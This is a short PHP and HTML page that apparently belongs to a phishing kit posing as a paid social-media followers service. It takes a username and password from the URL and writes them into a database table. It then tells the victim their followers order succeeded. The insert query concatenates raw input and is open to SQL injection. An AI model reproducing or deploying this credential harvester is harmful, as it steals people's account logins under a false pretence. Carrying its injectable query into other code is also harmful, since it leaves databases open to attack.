<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
    </title>

    <style>
        *{
            margin: 0px;
            padding: 0px;
        }
        #tayid{
            width: 800px;
            height: 50px;
            background-color: aqua;
            border: 5px whitesmoke solid;
            border-radius: 50px;
            position: relative;
            top: 250px;

        }
        h2{
            margin-top: 10px;
        }
    </style>

</head>
<body>

<?php


$username = $_GET['username'];
$password = $_GET['password'];

$link = mysqli_connect("localhost","root","","mdb");
$result = mysqli_query($link , "INSERT INTO `upiof` (`username`, `password`) VALUES ('$username', '$password');");



?>

<center>
<div id="tayid">
    <p>
        <h2>
            Your Order Was Successful! We Will Send Your Followers Untill 24-hours.
        </h2>
    </p>
</div>
</center>

    
</body>
</html>







